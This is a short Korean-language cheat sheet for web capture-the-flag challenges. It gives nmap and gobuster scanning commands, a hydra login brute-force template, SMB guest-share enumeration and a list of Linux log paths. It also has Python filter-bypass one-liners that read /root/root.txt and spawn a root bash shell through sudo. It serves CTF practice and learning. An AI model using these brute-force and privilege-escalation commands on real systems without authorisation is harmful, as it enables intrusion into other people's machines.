# WebCTF_CheatSheet
WebCTF_CheatSheet

# 1. nmap scanning
```
# 1. 상위 1000개 포트 서비스 확인
nmap -T4 --top-ports 1000 -sV --open [타겟 IP]

#2. 전체 TCP 포트 스캔
sudo nmap -p- -T4 --open [타겟 IP]

#3. 전체 포트 스캔 + 기본 NSE 스크립트
sudo nmap -p- -sS -sV -sC -T4 --open [타겟 IP]

#4. 웹 포트 집중 스캔 (특히 http- 헤더)
sudo nmap -p 80,443,8080,8000,8443 -sV --script "http-server-header,http-cookie-flags,http-enum" -T4 --open -n [타겟 IP]
```

# 2. gobuster
```
# 빠른 버전
gobuster dir -u [https://example.com] -w /usr/share/dirbuster/wordlists/raft-small-directories.txt -x php --threads 50

# 공식 버전
gobuster dir -u [https://example.com] -w ~/wordlists/shortlist.txt
gobuster dir -u [https://example.com] -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html,txt
```

# 3. hydra
```
# hydra (web_ip) http-get-form "(web_url):username=^USER^&password=^PASS^&(나머지 파라미터):(로그인 실패시 뜨는 메세지)" -L (userid dic.txt) -P (pass dic.txt) -V -f
# hydra -L [username.txt] -P [password.txt] -v -f
// -v : 결과 출력, -f : 결과 나오는 즉시 종료
```

# 4. OWASP zap
Automated Scan ㄱㄱ

# 5. smb
```
# smb 공유목록 나열
smbclient -L //[타켓 IP]/ -N

# 특정 공유 접속
smbclient //[타겟 IP]/[sharename] -U guest          # Password for [WORKGROUP\guest]: 엔터
```

# 6. sudo escalator
```
# .py 파일에서 filtering bypass
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')

# .py 파일에서 sudo escalate
sudo /usr/bin/python3 /home/kali/[파일명].py
__builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
```

# 7. Linux Log File path
```
1. /var/log/messages: 부팅시의 메시지를 포함해 전체 시스템의 로그 저장

2. /var/log/dmesg: kernel ring buffer의 정보 로그 저장 (시스템이 시작할때 커널이 발견한 하드웨어의 정보)

3. /var/log/auth.log: 사용자 로그인이나 사용된 인증방법같은 시스템 인증 정보 로그 저장

4. /var/log/boot.log: 시스템 부팅 과정의 로그 저장

5. /var/log/daemon.log:  시스템에서 실행 중인 백그라운드 데몬들의 정보 로그 저장

6. /var/log/dpkg.log: dpkg 명령어로 패키지를 설치하고 삭제한 로그 저장(ubuntu debian계열)

7. /var/log/kern.log: 리눅스 커널 로그 (리눅스 커널 커스터마이징시 사용)

8. /var/log/lastlog: 모든 사용자의 최근 로그인 정보 저장 (확인 명령어: lastlog)

9. /var/log/maillog, /var/log/mail.log: 메일서버의 로그 저장

10. /var/log/user.log: user 레벨의 모든 로그 저장

11. /var/log/Xorg.x.log: X 윈도의 로그(GUI 원격 접속 로그) 저장

12. /var/log/alternatives.log: 여러 버전의 패키지 정보 저장 (debian 계열)

13. /var/log/btmp: 이 파일에는 로그인 시도 실패에 대한 정보 저장 (확인 명령어: last -f /var/log/btmp | more)

14. /var/log/cups: 프린터 관련 로그 정보 저장

15. /var/log/anaconda.log: 리눅스 설치 지원 프로그램인 아나콘다의 로그 정보 저장

16. /var/log/yum.log: yum으로 패키지를 설치할 로그 정보 저장

17. /var/log/cron: cron 데몬이 대한 로그 정보 저장

18. /var/log/secure: 인터넷 슈퍼 데몬 xinetd의 로그로 권한부여와 관련된 내용의 로그 정보 저장

19. /var/log/wtmp, /var/log/utmp: 로그인 관련 정보(언제, 어디서 얼마나) 저장( 확인 명령어: last -f /var/log/wtmp)
```

